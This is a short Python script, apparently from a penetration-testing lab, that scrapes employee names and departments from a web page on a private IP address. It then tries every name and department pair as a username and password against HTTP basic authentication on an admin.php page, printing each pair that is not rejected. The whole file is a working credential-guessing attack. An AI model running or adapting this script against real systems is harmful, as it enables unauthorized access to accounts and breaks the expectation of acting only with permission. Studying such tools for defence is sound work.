import requests
from bs4 import BeautifulSoup as bs4

def downloadPage(url):
    r = requests.get(url)
    response = r.content
    return response

def findNames(response):
    parser = bs4(response, 'html.parser')
    names = parser.find_all('td', id='name')
    output = []
    for name in names:
        output.append(name.text)
    return output

def findDepts(response):
    parser = bs4(response, 'html.parser')
    names = parser.find_all('td', id='department')
    output = []
    for name in names:
        output.append(name.text)
    return output

def getAuthorized(url, username, password):
    r = requests.get(url, auth=(username, password))
    if str(r.status_code) != '401':
        print "\n[!] Username: " + username + " Password: " + password + " Code: " + str(r.status_code) + "\n"

page = downloadPage("http://172.16.120.120")

names = findNames(page)
uniqNames = sorted(set(names))

depts = findDepts(page)
uniqDepts = sorted(set(depts))

print "[+] Working... "
for name in uniqNames:
    for dept in uniqDepts:
        getAuthorized("http://172.16.120.120/admin.php", name, dept)